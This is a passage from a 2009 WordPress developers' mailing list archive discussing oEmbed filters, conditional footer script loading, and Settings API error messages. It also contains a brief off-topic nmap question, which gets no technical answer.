If the video hasn't these params, it stays above other elements on the
page, such as a dropdown menu.

Thank you.

-- 
Aldo Latino
OpenPGP key: 4096R/0xA18E41E8


From otto at ottodestruct.com  Wed Dec 16 21:28:44 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 16 Dec 2009 15:28:44 -0600
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <1260998693.25350.6.camel@zen>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com> 
	<9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com> 
	<161617690912161153n720664eex96b433674a4066a0@mail.gmail.com> 
	<1260998693.25350.6.camel@zen>
Message-ID: <161617690912161328q777fac38se25af393f44a7835@mail.gmail.com>

The embed_oembed_html filter is applied to all the returned HTML.

-Otto



On Wed, Dec 16, 2009 at 3:24 PM, Aldo Latino <aldolat at gmail.com> wrote:
> Slightly OT.
>
> Is it possible - via functions.php - to modify the code returned by
> oEmbed for flash videos? The modification should add this line
> <param name='wmode' value='transparent' />
>
> and wmode to embed tag:
> <embed ... wmode="transparent" ... >
>
> If the video hasn't these params, it stays above other elements on the
> page, such as a dropdown menu.
>
> Thank you.
>
> --
> Aldo Latino
> OpenPGP key: 4096R/0xA18E41E8
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aaron at jorb.in  Wed Dec 16 21:38:25 2009
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 16 Dec 2009 13:38:25 -0800
Subject: [wp-hackers] wp _ enqueue _ script() not working while in the
	Loop
In-Reply-To: <20091216204940.2403C181B04DB@dd19416.kasserver.com>
References: <20091216204940.2403C181B04DB@dd19416.kasserver.com>
Message-ID: <dc89e3ef0912161338w64ddbf8r91c5c831c77bf409@mail.gmail.com>

The wp_enqueue_script action happens just after wp_head, so unless your loop
happens before then(which would be very odd)  , it won't function.

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Wed, Dec 16, 2009 at 12:49 PM, TobiasBg <wp-hackers at tobias.baethge.com>wrote:

> Hi,
>
> for a plugin, I'm trying to achieve something really simple (I would
> think):
> I have a shortcode that gets replaced with some string, as usual.
> Now I want to enqueue a JavaScript file *to the footer* while parsing the
> Shortcode.
> That way, the JS file will only be included on pages where the Shortcode is
> actually shown.
> And by using wp_enqueue_script I can make sure that it is still only loaded
> once in case there is more than one of the same Shortcodes on the page.
>
> Now the problem: It doesn't work. It seems that I can not enqueue a script
> to the footer, while I'm already in the Loop, although there's nothing that
> should prohibit that.
>
> Can someone kindly point me to the right direction? Am I doing something
> wrong or is it just not possible to add scripts to the footer like that? (If
> not, it should.) Thanks!
>
> This is a short demo plugin, illustrating what I'm trying to do. It works
> except for the inclusion of the JS.
> To try it, just put a shortcode like [demo foo="my-string" /] into a post.
>
> ##################################################
> <?php
> /*
> Plugin Name: Demo Enqueue Script
> */
>
> function demo_shortcode_handler( $atts ) {
>    $default_atts = array( 'foo' => 'bar' );
>    $atts = shortcode_atts( $default_atts, $atts );
>
>    // why does the JS not show up?
>    wp_enqueue_script( 'demo-js', 'path/to/demo.js', false, '1.0', true );
>
>    return 'Your foo argument was: ' . $atts['foo'];
> }
>
> add_shortcode( 'demo', 'demo_shortcode_handler' );
>
> ##################################################
>
> Thanks a lot!
> Tobias
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aaron at xavisys.com  Wed Dec 16 21:54:51 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Wed, 16 Dec 2009 14:54:51 -0700
Subject: [wp-hackers] Developer portal
In-Reply-To: <1A0B9563-649E-45F0-81E8-92F31AB77C92@striderweb.com>
References: <4B22AD95.8040401@mullenweg.com>	<op.u4s65yocr6yny2@toscho.de>	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>	<4B27D79F.3040803@mullenweg.com>
	<4B28E60E.20802@xavisys.com>
	<1A0B9563-649E-45F0-81E8-92F31AB77C92@striderweb.com>
Message-ID: <4B29572B.7060007@xavisys.com>

To clarify, I didn't mean that I hadn't found them and read them, I 
meant that I hadn't seen anyone in this thread suggest that they be a 
part of the developer portal (and I think they should be).

Stephen Rider wrote:
> On Dec 16, 2009, at 7:52 AM, Aaron D. Campbell wrote:
>   
>> One that I haven't seen (but I haven't completely read every message in this thread) is coding standards.  These vary from project to project (for example, if you contribute to Zend Framework you need to format code differently than if you contribute to WordPress), so it would be great to have them available even for experienced developers.
>>     
>
> Ahem: <http://lmgtfy.com/?q=wordpress+coding+standards&l=1>
>
> ;-)
>   


From wp-hackers at tobias.baethge.com  Wed Dec 16 21:58:31 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Wed, 16 Dec 2009 22:58:31 +0100 (CET)
Subject: [wp-hackers]
	=?utf-8?q?=5B_wp-hackers_=5D_wp_=5F_enqueue_=5F_scri?=
	=?utf-8?q?pt=28=29_not_working_while_in_the_Loop?=
In-Reply-To: <dc89e3ef0912161338w64ddbf8r91c5c831c77bf409@mail.gmail.com>
Message-ID: <20091216215831.8F949181B04DA@dd19416.kasserver.com>

Hi,

> The wp_enqueue_script action happens just after wp_head, so unless your loop
> happens before then(which would be very odd)??, it won't function.

If you are refering to wp_enqueue_scripts (did you miss the s for a typo?), I can't really see that.

"wp_enqueue_scripts" is attached to wp_head, correct.
But it is nothing more than a wrapper for another action hook (with the same name). Basically to give developers a more logical place to use for enqueuing then pure wp_head.
By default there's nothing attached to it (I couldn't grep anything).

The actual printing of the scripts is done by "wp_print_head_scripts" and "wp_print_footer_scripts" (as far as I understand the code), which are attached to "wp_head" and "wp_footer" respectively.

And while I'm in the Loop, I clearly enqueue the script before wp_footer. So I still don't get it, why it won't work... :-(

Regards,
Tobias




From otto at ottodestruct.com  Wed Dec 16 22:02:04 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 16 Dec 2009 16:02:04 -0600
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <20091216215831.8F949181B04DA@dd19416.kasserver.com>
References: <dc89e3ef0912161338w64ddbf8r91c5c831c77bf409@mail.gmail.com> 
	<20091216215831.8F949181B04DA@dd19416.kasserver.com>
Message-ID: <161617690912161402x7d38c067m3c4d68269e772b84@mail.gmail.com>

Efficiency is biting you here.

The footer output works, but scripts still need to be enqueued before
the wp_head call. Even footer included ones.

The reason has to do with the way the print_scripts calls work. The
first one called from wp_head processes all the enqueued scripts. If
it see a footer one, it saves it in an array called "in_footer". The
print_footer_scripts then prints those out later.

So enqueueing in the middle of the page won't do you any good. After
wp_head, the scripts are fixed. What is known to be included has
already been decided, you can't add anything later.

If you want to determine whether a shortcode is used or not to include
a script, you have to scan ahead to the content. Write your own Loop
to look for the shortcode, then do a rewind to reset the loop for
another go-through by the main page.


-Otto
Sent from Memphis, TN, United States


On Wed, Dec 16, 2009 at 3:58 PM, TobiasBg <wp-hackers at tobias.baethge.com> wrote:
> Hi,
>
>> The wp_enqueue_script action happens just after wp_head, so unless your loop
>> happens before then(which would be very odd)??, it won't function.
>
> If you are refering to wp_enqueue_scripts (did you miss the s for a typo?), I can't really see that.
>
> "wp_enqueue_scripts" is attached to wp_head, correct.
> But it is nothing more than a wrapper for another action hook (with the same name). Basically to give developers a more logical place to use for enqueuing then pure wp_head.
> By default there's nothing attached to it (I couldn't grep anything).
>
> The actual printing of the scripts is done by "wp_print_head_scripts" and "wp_print_footer_scripts" (as far as I understand the code), which are attached to "wp_head" and "wp_footer" respectively.
>
> And while I'm in the Loop, I clearly enqueue the script before wp_footer. So I still don't get it, why it won't work... :-(
>
> Regards,
> Tobias
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aldolat at gmail.com  Wed Dec 16 22:08:35 2009
From: aldolat at gmail.com (Aldo Latino)
Date: Wed, 16 Dec 2009 23:08:35 +0100
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <161617690912161328q777fac38se25af393f44a7835@mail.gmail.com>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>
	<9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>
	<161617690912161153n720664eex96b433674a4066a0@mail.gmail.com>
	<1260998693.25350.6.camel@zen>
	<161617690912161328q777fac38se25af393f44a7835@mail.gmail.com>
Message-ID: <1261001315.25350.14.camel@zen>

Il giorno mer, 16/12/2009 alle 15.28 -0600, Otto ha scritto:
> The embed_oembed_html filter is applied to all the returned HTML.

Probably I didn't explained well my question. :-)

     1. I want to publish a post from youtube
     2. I copy & paste the URL such as
        http://www.youtube.com/watch?v=nTDNLUzjkpg in my writing panel
     3. I publish the post
     4. I go to my frontend and the video is on top of other elements,
        such as my dropdown menu.

To fix this it would be enough to add the parameter
<param name='wmode' value='transparent' />

and wmode to embed tag:
<embed ... wmode="transparent" ... >

Is there a way to modify the code returned from youtube in order to add
these lines?

-- 
Aldo Latino
OpenPGP key: 4096R/0xA18E41E8


From aaron at jorb.in  Wed Dec 16 22:12:53 2009
From: aaron at jorb.in (Aaron Jorbin)
Date: Wed, 16 Dec 2009 14:12:53 -0800
Subject: [wp-hackers] How to fix oEmbed in 2.9
In-Reply-To: <1261001315.25350.14.camel@zen>
References: <161617690912161142j4aa5a43ejb11e5b275f9fc2a2@mail.gmail.com>
	<9b6c20460912161150u439b5177m4b724f1c9cf89c8b@mail.gmail.com>
	<161617690912161153n720664eex96b433674a4066a0@mail.gmail.com>
	<1260998693.25350.6.camel@zen>
	<161617690912161328q777fac38se25af393f44a7835@mail.gmail.com>
	<1261001315.25350.14.camel@zen>
Message-ID: <dc89e3ef0912161412n26d2e3eev800f3430a0847e22@mail.gmail.com>

Yes, you need to add a filter to embed_oembed_html that modifies it.  Read
up on filters at http://codex.wordpress.org/Function_Reference/add_filterand
http://codex.wordpress.org/Plugin_API#Filters .   It shouldn't be too hard
with a regular expression.


http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Wed, Dec 16, 2009 at 2:08 PM, Aldo Latino <aldolat at gmail.com> wrote:

> Il giorno mer, 16/12/2009 alle 15.28 -0600, Otto ha scritto:
> > The embed_oembed_html filter is applied to all the returned HTML.
>
> Probably I didn't explained well my question. :-)
>
>     1. I want to publish a post from youtube
>     2. I copy & paste the URL such as
>        http://www.youtube.com/watch?v=nTDNLUzjkpg in my writing panel
>     3. I publish the post
>     4. I go to my frontend and the video is on top of other elements,
>        such as my dropdown menu.
>
> To fix this it would be enough to add the parameter
> <param name='wmode' value='transparent' />
>
> and wmode to embed tag:
> <embed ... wmode="transparent" ... >
>
> Is there a way to modify the code returned from youtube in order to add
> these lines?
>
> --
> Aldo Latino
> OpenPGP key: 4096R/0xA18E41E8
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Wed Dec 16 22:18:03 2009
From: scribu at gmail.com (scribu)
Date: Thu, 17 Dec 2009 00:18:03 +0200
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <161617690912161402x7d38c067m3c4d68269e772b84@mail.gmail.com>
References: <dc89e3ef0912161338w64ddbf8r91c5c831c77bf409@mail.gmail.com>
	<20091216215831.8F949181B04DA@dd19416.kasserver.com>
	<161617690912161402x7d38c067m3c4d68269e772b84@mail.gmail.com>
Message-ID: <349fe48b0912161418v32250b8dhdd9cac0f6ffcdc6c@mail.gmail.com>

Here's how I would conditionally load javascript using the WP script loader:

function register_my_scripts() {
wp_register_script('my-script', etc...);
}

add_action('template_redirect', 'register_my_script');


...


// in the shortcode handler:

$GLOBALS['load_my_script'] = true;


...


function print_my_script() {
global $wp_scripts, $load_my_script;

if ( $load_my_script )
$wp_scripts->do_items('my-script');
}

add_action('wp_footer', 'print_my_script');


I hope you get the gist of it.


-- 
http://scribu.net

From jer at simianuprising.com  Wed Dec 16 23:23:32 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 16 Dec 2009 18:23:32 -0500
Subject: [wp-hackers] Settings API: Showing errors if validation fails
Message-ID: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>

After the recent discussion about the Settings API and before I added a
bunch of settings to my custom plugin I decided to follow Otto's tutorial
and set up my options page using registered settings, settings sections and
settings fields. (
http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/)

It took a while but I got it all working and overall I'm really happy with
how the system works and cleans up my incredibly messy code.

That said I can't find any way to show users errors when they give invalid
input.

When you register_setting() your setting (which is probably an array of
options, you run register_settings() once for each wp_options entry), you
give it a validation callback function.

This function gives you $input which is the $_POST value for your option and
you return the value you want saved to the db. It actually runs as a filter
during update_option(), which is what gets run on all the Settings API stuff
when you save the page. The idea is you filter/sanitize etc the data in the
function and only return what is good.

This works great if what you want to do is either a) return correct input or
b) return absolutely nothing, but leaves you stranded if you want to help
your users correct their mistake. In fact no matter what happens with the
validation the user sees "Settings Saved" at the top of the screen after
submitting a form. This is super bad usability and could easily lead to lots
of users thinking their data was saved when in fact it wasn't.

As a perfect example of the defect try changing the admin email setting in a
WP install to something without an @ sign (a validation error). The result
is 'Settings Saved' at the top and an empty admin email field. Needless to
say, this is a nightmare for so many reasons.


So my question: Has anyone found a way around this issue on their own? As
far as I can tell there is no built in way to handle it, but maybe someone
has a hack we can use till it gets solved in core? Preferably something that
takes less code than going back to not using the Settings API?

Part of the problem is that the processing and validation happen on a
different execution from the pageload the user ends up on, during the load
of /wp-admin/options.php, which is what you target your <form> at when using
the Settings API. Once the Settings API has finished its saving/validation
it does this:

    $goback = add_query_arg( 'updated', 'true', wp_get_referer() );
    wp_redirect( $goback );

So there is pretty much no way to send back data about the validation error.

In #wordpress-dev Mark Jaquith recommended doing

    wp_redirect( $your_plugin_admin_url . '&mypluginerrorid=1' );
    exit();

when there is a validation error. But that would mean giving up on any other
values in the same registered setting (none of it would be saved), as well
as any other setting sections/fields that hadn't been processed yet during
that form submission.

Any ideas?

In terms of building out core to take care of it I think the solution is a
function that can be called during an options validation that saves a value
which gets added to the wp_redirect() before it gets sent back. I.e. in
options.php instead of just adding 'updated', 'true' it would first check
for an alternate message and use that instead. Something like:

    add_settings_error("Sorry, what you entered for Admin Email is
definitely not an email. Maybe an @ would be nice?");

Then something like get_settings_error() to fill the add_query_var() before
redirection.

You could also create a $error_msg variable in your validation function and
just add new text to it as you go along validating different values. This
way you could also put good news in there like "Email saved, subscription
preferences saved" etc.

Without any error messaging about validation the Settings API is pretty
crippled, almost to the point of being useless compared to  processing the
values yourself. Hopefully I'm just missing something obvious and Otto can
yell at me for writing such a long email for nothing :)

Wishing I'd kicked the tires more when this first came out,

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From dave69 at gmail.com  Thu Dec 17 00:58:08 2009
From: dave69 at gmail.com (Dave R)
Date: Thu, 17 Dec 2009 11:58:08 +1100
Subject: [wp-hackers] contact form 7 bug in ie6
In-Reply-To: <dea5cae00912161653u6404b333tdbb995dcdd458231@mail.gmail.com>
References: <dea5cae00912161653u6404b333tdbb995dcdd458231@mail.gmail.com>
Message-ID: <dea5cae00912161658u61fdf5f3ge48fe3afbd01059f@mail.gmail.com>

Yes ,yes, bloody ie6!

The form on this page: http://coogeedesign.com.au/contact

In ie6 the name, email and phone text fields do not display, and I can't for
the life of me work out why.

Any ideas?


Cheers,
Dave
....................................

business: www.zavadesign.com
personal: www.nakedchronicles.com
supports: www.michezoyouth.com

From photofantaisie at gmail.com  Thu Dec 17 07:18:56 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Thu, 17 Dec 2009 08:18:56 +0100
Subject: [wp-hackers] Settings API: Showing errors if validation fails
In-Reply-To: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
References: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
Message-ID: <9dd057850912162318h265eed11g18903c2b1b596849@mail.gmail.com>

Jeremy,

I ran across exactly the same problem you describe with one of my
plugins<http://wordpress.org/extend/plugins/dynamic-content-gallery-plugin/>.
In fact, just adding a simple Reset Settings option on the Settings page
became problematic in order to get a "You have reset the settings" message
to work. You're right, the problem is the page redirect which means the
usual old methods of doing this don't work.

I ended up using two functions: the register_settings callback function just
to sanitise the user input and a separate validation function to recheck
what's been entered and generate error messages if necessary. The validation
function is called each time the Settings page is loaded. As for the Reset
message, I have ended up with a rather clunky (or so it seems to me) method,
which involves a hidden option called "just-reset". This is captured in the
$input array and, if "true", $input is replaced with the default settings,
and $input['just-reset'] is set to true (all options are kept in one array,
which is the reason for this), and then the $input array is returned. I then
have another function hooked to admin_notices which checks if the
$options['just-reset'] is true and, if so, prints out a "You've reset your
settings to default" message, then changes $options['just-reset'] to false,
and then runs update_option. It's probably easier to follow me if you look
at the source code of the plugin in question, :-/

My clunky approach works and, since the Settings page is rarely touched once
the plugin has been initially set-up, I'm not too worried about the extra
code that all of this involves. Having said that, there should be an easier
way. Perhaps there is, and I've missed it?

Certainly, I agree, there should be an easier way to do something more with
the output of the register_settings callback function.

Hope this helps.

Ade.



2009/12/17 Jeremy Clarke <jer at simianuprising.com>

> After the recent discussion about the Settings API and before I added a
> bunch of settings to my custom plugin I decided to follow Otto's tutorial
> and set up my options page using registered settings, settings sections and
> settings fields. (
> http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/)
>
> It took a while but I got it all working and overall I'm really happy with
> how the system works and cleans up my incredibly messy code.
>
> That said I can't find any way to show users errors when they give invalid
> input.
>
> When you register_setting() your setting (which is probably an array of
> options, you run register_settings() once for each wp_options entry), you
> give it a validation callback function.
>
> This function gives you $input which is the $_POST value for your option
> and
> you return the value you want saved to the db. It actually runs as a filter
> during update_option(), which is what gets run on all the Settings API
> stuff
> when you save the page. The idea is you filter/sanitize etc the data in the
> function and only return what is good.
>
> This works great if what you want to do is either a) return correct input
> or
> b) return absolutely nothing, but leaves you stranded if you want to help
> your users correct their mistake. In fact no matter what happens with the
> validation the user sees "Settings Saved" at the top of the screen after
> submitting a form. This is super bad usability and could easily lead to
> lots
> of users thinking their data was saved when in fact it wasn't.
>
> As a perfect example of the defect try changing the admin email setting in
> a
> WP install to something without an @ sign (a validation error). The result
> is 'Settings Saved' at the top and an empty admin email field. Needless to
> say, this is a nightmare for so many reasons.
>
>
> So my question: Has anyone found a way around this issue on their own? As
> far as I can tell there is no built in way to handle it, but maybe someone
> has a hack we can use till it gets solved in core? Preferably something
> that
> takes less code than going back to not using the Settings API?
>
> Part of the problem is that the processing and validation happen on a
> different execution from the pageload the user ends up on, during the load
> of /wp-admin/options.php, which is what you target your <form> at when
> using
> the Settings API. Once the Settings API has finished its saving/validation
> it does this:
>
>    $goback = add_query_arg( 'updated', 'true', wp_get_referer() );
>    wp_redirect( $goback );
>
> So there is pretty much no way to send back data about the validation
> error.
>
> In #wordpress-dev Mark Jaquith recommended doing
>
>    wp_redirect( $your_plugin_admin_url . '&mypluginerrorid=1' );
>    exit();
>
> when there is a validation error. But that would mean giving up on any
> other
> values in the same registered setting (none of it would be saved), as well
> as any other setting sections/fields that hadn't been processed yet during
> that form submission.
>
> Any ideas?
>
> In terms of building out core to take care of it I think the solution is a
> function that can be called during an options validation that saves a value
> which gets added to the wp_redirect() before it gets sent back. I.e. in
> options.php instead of just adding 'updated', 'true' it would first check
> for an alternate message and use that instead. Something like:
>
>    add_settings_error("Sorry, what you entered for Admin Email is
> definitely not an email. Maybe an @ would be nice?");
>
> Then something like get_settings_error() to fill the add_query_var() before
> redirection.
>
> You could also create a $error_msg variable in your validation function and
> just add new text to it as you go along validating different values. This
> way you could also put good news in there like "Email saved, subscription
> preferences saved" etc.
>
> Without any error messaging about validation the Settings API is pretty
> crippled, almost to the point of being useless compared to  processing the
> values yourself. Hopefully I'm just missing something obvious and Otto can
> yell at me for writing such a long email for nothing :)
>
> Wishing I'd kicked the tires more when this first came out,
>
> --
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at tobias.baethge.com  Thu Dec 17 09:49:19 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Thu, 17 Dec 2009 10:49:19 +0100 (CET)
Subject: [wp-hackers]
	=?utf-8?q?wp_=5F_enqueue_=5F_script=28=29_not_workin?=
	=?utf-8?q?g_while_in_the_Loop?=
In-Reply-To: <161617690912161402x7d38c067m3c4d68269e772b84@mail.gmail.com>
Message-ID: <20091217094919.72BF2181B04C0@dd19416.kasserver.com>

Hi Otto,

thanks for the clarification on how the scripts adding works.

> The reason has to do with the way the print_scripts calls work. The
> first one called from wp_head processes all the enqueued scripts. If
> it see a footer one, it saves it in an array called "in_footer". The
> print_footer_scripts then prints those out later.

If there is such an array "in_footer", wouldn't it be possible to simply add an entry to that for my script? I'm aware that I would lose things like dependency checks, but actually I don't need those.

> If you want to determine whether a shortcode is used or not to include
> a script, you have to scan ahead to the content. Write your own Loop
> to look for the shortcode, then do a rewind to reset the loop for
> another go-through by the main page.

That's a suggestion that I will look into, but it will probably only solve the issue half, as I'm not only wanting to enqueue the script if a Shortcode is found, but also if my template tag function is executed (which obviously also happens after wp_head).

Thanks!
Tobias




From wp-hackers at tobias.baethge.com  Thu Dec 17 10:00:58 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Thu, 17 Dec 2009 11:00:58 +0100 (CET)
Subject: [wp-hackers]
	=?utf-8?q?wp_=5F_enqueue_=5F_script=28=29_not_workin?=
	=?utf-8?q?g_while_in_the_Loop?=
In-Reply-To: <349fe48b0912161418v32250b8dhdd9cac0f6ffcdc6c@mail.gmail.com>
Message-ID: <20091217100058.DEDB01818DE26@dd19416.kasserver.com>

Hi scribu,

thanks for your code example. That's pretty close to what I'm currently doing (except for using a global variable I use a class variable).
Given the existence of wp_enqueue_script, I thought I could do that a little bit more elegant and robust.
Robust in terms of:
I have two plugins (with different functionality and purpose) that both happen to want to use a JS script (i.e. a jQuery plugin, not included in core, so each plugin ships a copy of the same JS file) in the footer (triggered by a Shortcode or a template tag function).
Now, if I use the way of manual wp_print_scripts in wp_footer, both of these plugins will print their script call in the footer (for the same JavaScript, just with different file names).
Now I thought I could circumvent that by using wp_enqueue_script, with the same "handle" parameter. Because then WP would take care of the actual printing and the script would only be included once.
(Does my explanation sound understandable?)

Of course both plugins could use the same global variable to cross-check, but that's cheep somehow and not really good practice, I guess.
Something similar that would also help: A function to check if a script (i.e. handle) has been printed. Then I could use that to check if printing is required...

Regards,
Tobias





From scribu at gmail.com  Thu Dec 17 10:35:35 2009
From: scribu at gmail.com (scribu)
Date: Thu, 17 Dec 2009 12:35:35 +0200
Subject: [wp-hackers] contact form 7 bug in ie6
In-Reply-To: <dea5cae00912161658u61fdf5f3ge48fe3afbd01059f@mail.gmail.com>
References: <dea5cae00912161653u6404b333tdbb995dcdd458231@mail.gmail.com>
	<dea5cae00912161658u61fdf5f3ge48fe3afbd01059f@mail.gmail.com>
Message-ID: <349fe48b0912170235r55a1879aj707ae11e707d5284@mail.gmail.com>

First, please contact the plugin author, using the support forums or
otherwise.


On Thu, Dec 17, 2009 at 2:58 AM, Dave R <dave69 at gmail.com> wrote:

> Yes ,yes, bloody ie6!
>
> The form on this page: http://coogeedesign.com.au/contact
>
> In ie6 the name, email and phone text fields do not display, and I can't
> for
> the life of me work out why.
>
> Any ideas?
>
>
> Cheers,
> Dave
> ....................................
>
> business: www.zavadesign.com
> personal: www.nakedchronicles.com
> supports: www.michezoyouth.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From scribu at gmail.com  Thu Dec 17 10:38:31 2009
From: scribu at gmail.com (scribu)
Date: Thu, 17 Dec 2009 12:38:31 +0200
Subject: [wp-hackers] wp _ enqueue _ script() not working while in the
	Loop
In-Reply-To: <20091217100058.DEDB01818DE26@dd19416.kasserver.com>
References: <349fe48b0912161418v32250b8dhdd9cac0f6ffcdc6c@mail.gmail.com>
	<20091217100058.DEDB01818DE26@dd19416.kasserver.com>
Message-ID: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>

On Thu, Dec 17, 2009 at 12:00 PM, TobiasBg <wp-hackers at tobias.baethge.com>wrote:

> Of course both plugins could use the same global variable to cross-check,
> but that's cheep somehow and not really good practice, I guess.
> Something similar that would also help: A function to check if a script
> (i.e. handle) has been printed. Then I could use that to check if printing
> is required...
>


That's why I use $wp_scripts->do_items(). It makes sure the same script
isn't included twice. You just have to make sure you use the same handle for
both plugins.


-- 
http://scribu.net

From jiawei.bai at gmx.com  Thu Dec 17 11:32:46 2009
From: jiawei.bai at gmx.com (jiawei.bai)
Date: Thu, 17 Dec 2009 19:32:46 +0800
Subject: [wp-hackers] The namp can change ip or mac??
Message-ID: <200912171932430894887@gmx.com>

Hi all:
      

     When I using nmap to scan , but some firewall can flter , so I want to know how to if the namp can change it's 

local  ip address or local mac to scan ?   


    Need your help.

2009-12-17 



jiawei.bai 

From wordpress at dd32.id.au  Thu Dec 17 11:34:51 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 17 Dec 2009 22:34:51 +1100
Subject: [wp-hackers] The namp can change ip or mac??
In-Reply-To: <200912171932430894887@gmx.com>
References: <200912171932430894887@gmx.com>
Message-ID: <op.u42yf9bbspxmuu@dd32>

Please be advised that this is a -WordPress- discussion mailing list  
designed for -Hackers-. Please see  
http://en.wikipedia.org/wiki/Hacker_(programmer_subculture) for a  
explanation of the term -Hacker-

On Thu, 17 Dec 2009 22:32:46 +1100, jiawei.bai <jiawei.bai at gmx.com> wrote:

> Hi all:
>
>      When I using nmap to scan , but some firewall can flter , so I want  
> to know how to if the namp can change it's
>
> local  ip address or local mac to scan ?
>
>
>     Need your help.
>
> 2009-12-17
>
>
>
> jiawei.bai
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From wp-hackers at tobias.baethge.com  Thu Dec 17 12:46:39 2009
From: wp-hackers at tobias.baethge.com (TobiasBg)
Date: Thu, 17 Dec 2009 13:46:39 +0100 (CET)
Subject: [wp-hackers]
	=?utf-8?q?=5B_wp-hackers_=5D_wp_=5F_enqueue_=5F_scri?=
	=?utf-8?q?pt=28=29_not_working_while_in_the_Loop?=
In-Reply-To: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>
Message-ID: <20091217124639.5C6C3181B04D1@dd19416.kasserver.com>

Hi,

> That's why I use $wp_scripts->do_items(). It makes sure the same script
> isn't included twice. You just have to make sure you use the same handle for
> both plugins.

Argh, stupid me. Of course it does (and so does its wrapper wp_print_scripts, that I prefer to use). I just had a typo in one of the handles... Thanks for pointing me to it!

I guess, I'll just leave this alone for today and go out and do some ... Christmas Shopping! :-)

Regards,
Tobias




From scribu at gmail.com  Thu Dec 17 15:03:49 2009
From: scribu at gmail.com (scribu)
Date: Thu, 17 Dec 2009 17:03:49 +0200
Subject: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not working
	while in the Loop
In-Reply-To: <20091217124639.5C6C3181B04D1@dd19416.kasserver.com>
References: <349fe48b0912170238s4168314cx91c21ba0f5eea58a@mail.gmail.com>
	<20091217124639.5C6C3181B04D1@dd19416.kasserver.com>
Message-ID: <349fe48b0912170703l29937a07i517fc54417b4ef04@mail.gmail.com>

 You're welcome. :)

I don't use wp_print_scripts() because some other plugins might have inline
scripts printed using the 'wp_print_scripts' hook.


On Thu, Dec 17, 2009 at 2:46 PM, TobiasBg <wp-hackers at tobias.baethge.com>wrote:

> Hi,
>
> > That's why I use $wp_scripts->do_items(). It makes sure the same script
> > isn't included twice. You just have to make sure you use the same handle
> for
> > both plugins.
>
> Argh, stupid me. Of course it does (and so does its wrapper
> wp_print_scripts, that I prefer to use). I just had a typo in one of the
> handles... Thanks for pointing me to it!
>


-- 
http://scribu.net

From otto at ottodestruct.com  Thu Dec 17 15:05:11 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 17 Dec 2009 09:05:11 -0600
Subject: [wp-hackers] Settings API: Showing errors if validation fails
In-Reply-To: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
References: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
Message-ID: <161617690912170705r449ed407p8eeefc7caa822742@mail.gmail.com>

You could use the admin_notices hook to generate your own error
messages based on whatever you like.

Basically, hook a function to admin_notices. In this function, you
need to check for your error case and generate output based on it.
Then, you can unset $_GET['updated'] to prevent the Settings saved
message from showing up.

Basically something like this:

1. On error detection, save the error somewhere that you can pick it
up later. Like an option, or a transient, or something.

2. On the admin_notices hooked function:

if ($parent_file == 'options-general.php' && $_GET['page'] ==
'my-plugin-page') {
// check the plugin option for errors
// found some errors? If so, then {
<div id="message" class="updated fade"><p><strong>No! You'll overload
